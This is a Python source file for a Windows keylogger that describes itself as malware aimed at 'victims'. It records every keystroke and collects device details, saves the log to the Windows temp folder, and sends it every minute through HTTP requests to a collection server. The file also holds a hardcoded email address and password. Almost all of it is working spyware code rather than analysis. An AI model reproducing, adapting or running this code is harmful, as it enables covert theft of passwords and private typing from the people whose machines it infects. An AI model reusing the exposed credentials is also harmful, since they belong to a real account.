import email
import os
import sys
import platform
import keyboard
import smtplib
from threading import Timer
from datetime import datetime
import requests
import hashlib
import time
import winreg

#winreg.OpenKey()




#embed AI script to process usage patterns of victims and adapt malware to usage
#patterns



SEND_REPORT_EVERY =  60
EMAIL_ADDRESS = "abdulhameedotade@gmail.com"
PASSWORD = "this_is_cryptox"
TMPDIR = 'C:\\Windows\Temp'
SUBJECT = "KEYLOG.INFO"
BODY = """
Keylog info from device
Specifications:
Machine:       {}
OS-Type:       {}/{}
Network:       {}
""".format(platform.machine(),os.name,platform.win32_ver(),platform.node())

# hash = hashlib.new('sha512')
# hash.update(EMAIL_ADDRESS.encode(encoding='utf-8'))
EMAIL_ADDRESS = 'abdulhameedotade@gmail.com'

print(BODY)

class Keylogger:
    
    def __init__(self,interval):
        self.interval = interval
        # self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        self.is_sent = False
        self.filename = ""
    
    def callback(self,event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "."  
            else:
                name = name.replace(" ","_")
                name = f"[{name.upper()}]"
        self.log += name

   

    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ","_").replace(":","")
        end_dt_str = str(self.end_dt)[:-7].replace(" ","-").replace(":","")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}-time-{time.time()}"

    def report_to_file(self):
       self.update_filename()
       path = os.path.join(TMPDIR,self.filename)
       with open(path,'xt') as f:
           f.write(f"DEVICE-INFO : {BODY}\n "+self.log)
           print(self.log)
           f.close()
       return path

    def sendLogs(self,filename="",email="",passcode=""):
        baseurl = "http://localhost:8000/log-keys" #modify URL with the updated route
        with open(filename,'r') as f:
            message = f.read().replace('@','%40')
            url = f"{baseurl}/email/{email}/passcode/{passcode}/logs/{message}"
            req = requests.get(url)
            print(req.content)
            if(req.status_code == 200 and req.content == b'OK'):
                print(f"[*] Logs sent successfully")
            else:
                print("[*] Unable to send logs. Have you checked url format")

    def report(self):

        if self.log:
           filename = self.report_to_file()
           self.sendLogs(filename,EMAIL_ADDRESS,passcode=PASSWORD)
        self.log = ""
        timer = Timer(interval=self.interval,function=self.report)
        timer.daemon = True
        timer.start()

    # def schedule_report(self):
    #     self.end_dt =  datetime.now()
    #     if(datetime.now().hour%24 >= 12):
    #         #self.is_sent = True
    #         self.sendmail(EMAIL_ADDRESS,EMAIL_PASSWORD,self.createMIME(f"{TMPDIR}\\{self.filename}.txt"))
    #     else:
    #         self.update_filename()
    #         self.report_to_file()
    #         self.start_dt = datetime.now()
    #     self.log = ""
    #     timer = Timer(interval=self.interval,function=self.schedule_report)
    #     timer.daemon = True
    #     timer.start()


    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()



if __name__ == "__main__":
    keylogger = Keylogger(SEND_REPORT_EVERY)
    keylogger.start()
